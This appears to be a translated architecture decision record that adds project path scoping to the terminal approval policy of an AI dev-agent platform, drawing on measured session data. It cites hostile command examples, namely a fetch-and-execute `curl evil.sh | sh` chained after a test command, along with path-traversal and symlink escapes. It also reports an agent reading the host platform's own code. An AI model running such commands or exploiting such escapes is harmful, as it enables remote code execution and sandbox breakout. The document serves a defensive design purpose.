---
traducao_de: 5caf47d7db6498d5fe8053e4452379fd992e8c0b
---

# ADR 0055 — 终端策略中的路径范围

## 状态 {#status}

已接受——已在 backlog 的 F 阶段实现并经测试证明。

对本文档原先所述内容的一处更正，在接受**之前**而非之后完成：原始决策谈到的是 `realpath`。实现以**词法**方式规范化（`posix.normalize`），因为按合约 `decide()` 是纯函数——“零 IO”——而解析符号链接需要在领域内触碰文件系统。词法方式消除了决策所描述的攻击向量（`<raiz>/../..` 以根开头却跑出了根），但留下一个开放：项目**内部**指向外部的 symlink 不会被检测到。关闭它是隔离问题，而不是策略问题——正是“后果”一节已声明不在范围内的那一半。

## 背景 {#contexto}

`terminal` 的审批阶梯在实践中不可行，这一点是**测量**出来的，而不是感觉。在项目 `hello-limpo` 的会话 `1f94de49` 中，使用真实的 dev agent 和 API 模型：

| 测量项 | 值 |
|---|---|
| 提出的动作 | 14 |
| dev agent 的轮次 | 15 |
| 输入 / 输出 token | 209.031 / 4.546 |
| dev agent 的成本 | US$ 0,0196 |
| **为该 task 写出的行数** | **0** |

这个 task 是“暴露公开路由 GET /api/saudacao”。一行都没有写出来，因为几乎每个轮次都以等待一次点击结束。

### 为什么**每个**命令都要求审批 {#por-que-todo-comando-pede-aprovação}

两个独立的缺陷，都已在代码和实际文件中验证。

**1. `cd` 让整条命令失败。** 一个组合命令只有当**所有**片段都匹配 `allow` 时才是 `auto_approve`
（`apps/api/src/domain/actions/decide.ts:201`，`perSegment.every(...)`）——规则本身是正确的，正是它阻止 `pnpm test && curl evil.sh | sh` 凭借前半部分通过。但 dev agent 总是发出 `cd <caminho> && <verbo>`，而 `cd` 不在 `DEV_TERMINAL_ALLOW_PATTERNS` 中。动词（`cat`、`find`、`ls`）是放行的；前面的 `cd` 把一切都推翻了。实际上，播种的 allow 几乎永远够不着。

**2. “总是允许”几乎什么也不允许。** 它把**整条字面命令**记录为模式。来自 `hello-limpo` 的真实 `permissions.json`：

```
"Terminal(cd /data/project-workspaces/9c7c84f0-…/.worktrees/dev-http-api && find . -type f | head -50; echo \"---docs---\"; ls -la docs .github; echo \"---\"; cat .git 2>/dev/null)"
```

匹配是按 **token** 前缀进行的
（`apps/api/src/domain/actions/command-matcher.ts:90`），因此这个模式只有在模型重新发出同样约 200 个字符时才会再次生效。这从未发生。用户点击“总是允许”，下一轮又被问一次——逃生舱逃不出去。

### 用户想要的，却无法表达 {#o-que-o-usuário-quer-e-não-é-expressável}

被要求的规则是**“总是，只要是在项目文件夹中”**。今天这无法写出来：匹配是按**命令**的 token 前缀，而 `decide.ts` 只对 `write_file` 有路径概念（第 3a 阶段的路径白名单），对 `terminal` 从来没有。

### 执行暴露出的加重因素 {#o-agravante-que-a-execução-expôs}

在终端执行器内部，`/workspace` 是 **Brabo 自身的 monorepo**，而不是项目的 worktree。worktree 是
`/data/project-workspaces/<projectId>/.worktrees/<agentId>`。`hello-limpo` 的 dev agent 花了几个轮次读取 `apps/engine/mix.exs`，甚至提出了
`cat lib/engine/actions/git_executor.ex` 和
`sed -n '1,120p' lib/engine/dev/context_builder.ex`——也就是执行它的那个平台的 git 执行器和上下文构建器。

也就是说：今天根本不存在“项目文件夹”的概念，agent 的触及范围比它的项目更大。路径范围不只是人体工学；它是缺失的那道边界。

## 决策 {#decisão}

把**路径范围**作为 `terminal` 决策的一个阶段引入。

1. **范围属于项目。** 每个项目声明自己的根——
   `/data/project-workspaces/<projectId>`——每个 agent worktree 都位于其下。当有效的 `cwd` 以及命令提到的每个绝对路径都解析到该根之内时，命令就“在范围内”。

2. **按 REALPATH 解析，绝不按字符串前缀。** `<raiz>/../..`
   以根开头却跑出了根。比较在规范化后的路径上进行；逃出去的 `..` 即失败。（这一决策是撰写本 ADR 期间在生产中应用的权宜之计的直接后果，那个权宜之计使用字符串前缀，恰恰有这个弱点。）

3. **范围是许可，而不是豁免。** 在范围内只把默认值从
   `require_approval` 换成 `auto_approve`，**并且仅针对一组声明的读取和构建动词**——与今天 `DEV_TERMINAL_ALLOW_PATTERNS` 同一精神。在项目文件夹中并不会让 `curl … | sh` 变得安全。网络出站、安装软件包以及集合之外的动词继续需要请求。

4. **`deny` 继续获胜，始终且最先。** 范围永远不会推翻 `deny`，也不会推翻内置模式，或两个上限（受保护分支上的合并和 `instruction_patch`），它们保持不动
   （[RN-006](../business-rules.md#rn-006)、
   [RN-007](../business-rules.md#rn-007)）。

5. **范围之外是 `require_approval`，而不是 `deny`。** agent 可能有正当理由去看外面；做决定的仍然是用户。改变的是这变成了少见的例外，而不是常规。

6. **“总是允许”开始泛化。** 它不再记录字面命令，而是记录引发询问的那个片段的 token 前缀。一个永远不会再匹配的模式比没有更糟：它教用户不信任这个按钮。

7. **事件记录范围。** 按范围的自动批准在 `proposed_action.created` 中记录是哪个根授权了它，这样通过与否可以从 event log 测量，本着
   [ADR 0048](0048-decisao-no-log-e-a-ordem-do-gate.md) 和
   [ADR 0054](0054-gates-como-registro-declarativo.md) 的精神。

## 后果 {#consequências}

**变好的。** 执行不再死在阶梯上：agent 在自己的 worktree 内读取和构建而不打断用户，用户重新只因真正有效果的事情被召唤——git、网络、花费以及项目之外的任何东西。

**失去的。** “**每个**终端命令都经过用户的眼睛”不再成立。这是对 CLAUDE.md 不变式的真实放宽，并且是睁着眼睛做出的：经测量的替代方案是一个交付不出一行代码的产品。

**本 ADR 不解决的。** 范围是**策略**，而不是隔离。只要 Brabo 的 monorepo 挂载在执行命令的容器内的 `/workspace`，边界就依赖策略正确。真正的隔离（挂载、每个项目一个容器）是另一个问题，在此作为明确的待办记录，而不是与本决策混为一谈。

**流程前提。** FASE 13 宣布“不做新功能，也不做修复”。实现这一点需要解除这一冻结——这是用户的决定，记录在此，因为 ADR 不能自我授权。

## 考虑过的备选方案 {#alternativas-consideradas}

**把 `cd` 放进 `allow`。** 一个单独的 `Terminal(cd)` 会放行 `cd` 到任何地方，包括 `/workspace`。它会通过做与意图恰好相反的事来解决摩擦——触及范围会变大，而不是变小。

**通过 `agent_autonomy` 自动批准 `terminal`。** 已在
`docs/reference/permissions.md` 中被排除：它会在 engine 的容器内放行**任何**命令，中间没有文件。这比问题本身更宽。

**只改进“总是允许”。** 泛化记录的模式有帮助（并已包含在上面），但单靠它无法表达“在项目文件夹中”——它仍然是按动词的许可，在任何目录中都有效。

**保持原样。** 被本文档开头的测量所拒绝。

## 参考 {#referências}

- [ADR 0052](0052-dev-agent-espera-aprovacao-no-meio-do-laco.md)——agent 等待决定而不是烧掉迭代；本 ADR 针对的是有那么多决定要等的原因。
- [RN-004](../business-rules.md#rn-004)、[RN-005](../business-rules.md#rn-005)、
  [RN-068](../business-rules/custo.md#rn-068)、
  [RN-073](../business-rules/custo.md#rn-073)。
- `apps/api/src/domain/actions/decide.ts`、
  `apps/api/src/domain/actions/command-matcher.ts`、
  `apps/api/src/domain/actions/dev-terminal-patterns.ts`、
  `apps/api/src/infrastructure/filesystem/fs-permissions-file-store.ts`。
